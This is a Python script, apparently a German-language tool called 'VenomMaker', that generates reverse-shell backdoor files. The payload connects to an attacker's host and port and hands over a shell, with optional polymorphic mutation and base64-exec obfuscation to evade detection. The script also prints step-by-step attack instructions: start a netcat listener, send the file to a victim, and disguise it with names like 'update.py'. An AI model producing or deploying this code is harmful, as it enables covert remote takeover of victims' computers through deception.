import base64
import os
from colorama import Fore, init
from polymorphic_engine import PolymorphicEngine

init(autoreset=True)


class VenomMaker:
    def __init__(self):
        self.engine = PolymorphicEngine()

    def banner(self):
        os.system("cls" if os.name == "nt" else "clear")
        print(f"""{Fore.GREEN}
  _    __                                  __  ___      __
 | |  / /__  ____  ____  ____ ___   ____  /  |/  /___ _/ /_____  _____
 | | / / _ \/ __ \/ __ \/ __ `__ \ / __ \/ /|_/ / __ `/ //_/ _ \/ ___/
 | |/ /  __/ / / / /_/ / / / / / // /_/ / /  / / /_/ / ,< /  __/ /    
 |___/\___/_/ /_/\____/_/ /_/ /_(_)____/_/  /_/\__,_/_/|_|\___/_/     
                                                                      
{Fore.WHITE}   >> PYTHON REVERSE SHELL GENERATOR (PRO) <<
""")

    def _obfuscate(self, code):
        """Simple Base64 Obfuscation Layer."""
        encoded = base64.b64encode(code.encode()).decode()
        # Payload wrapper that decodes and executes
        return f"""
import base64
exec(base64.b64decode('{encoded}').decode())
"""

    def generate_payload(self, lhost, lport, filename, target_os, pro=False):
        print(f"\n{Fore.YELLOW}[*] Generiere Payload (Pro={pro}) für {target_os}...")

        shell_cmd = '["/bin/sh", "-i"]' if target_os == "linux" else '["cmd.exe"]'

        # Der bösartige Code (Client)
        payload = f"""
import socket
import subprocess
import os

# CONFIG
HOST = '{lhost}'
PORT = {lport}

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        
        # Umleitung der Streams
        os.dup2(s.fileno(), 0) # stdin
        os.dup2(s.fileno(), 1) # stdout
        os.dup2(s.fileno(), 2) # stderr
        
        # Shell starten
        p = subprocess.call({shell_cmd})
    except Exception as e:
        pass

if __name__ == "__main__":
    connect()
"""

        if pro:
            payload = self.engine.mutate(payload)
            final_code = self._obfuscate(payload)
        else:
            final_code = payload

        try:
            with open(filename, "w") as f:
                f.write(final_code)
            print(f"{Fore.GREEN}[SUCCESS] Backdoor gespeichert als: {filename}")
            print(f"{Fore.CYAN}\n[ANLEITUNG ZUM ANGRIFF]")
            print("1. Starte auf DEINEM PC einen Listener:")
            print(f"   {Fore.WHITE}nc -lvnp {lport}")
            print(f"2. Sende die Datei '{filename}' an das Opfer.")
            print(f"3. Wenn das Opfer sie startet (python3 {filename}), hast du Zugriff!")

        except Exception as e:
            print(f"{Fore.RED}[ERROR] {e}")

    def run(self):
        self.banner()
        print(f"{Fore.WHITE}Dieses Tool erstellt eine Python-Datei, die sich mit dir verbindet.")

        lhost = input(f"\n{Fore.GREEN}[?] Deine IP (LHOST) (z.B. IP von tun0 oder eth0): ")
        lport = input(f"{Fore.GREEN}[?] Port zum Lauschen (LPORT) (z.B. 4444): ")

        print(f"\n{Fore.CYAN}Target OS wählen:")
        print("1. Linux")
        print("2. Windows")
        os_choice = input(f"{Fore.GREEN}[?] Auswahl (1/2): ")
        target_os = "windows" if os_choice == "2" else "linux"

        pro_choice = input(f"{Fore.GREEN}[?] Obfuscation aktivieren (y/n): ").lower()
        pro = pro_choice == "y"

        fname = input(f"{Fore.GREEN}[?] Dateiname (z.B. update.py): ")

        if not fname.endswith(".py"):
            fname += ".py"

        self.generate_payload(lhost, lport, fname, target_os, pro=pro)
        input(f"\n{Fore.WHITE}[ENTER] Zurück...")


if __name__ == "__main__":
    tool = VenomMaker()
    tool.run()
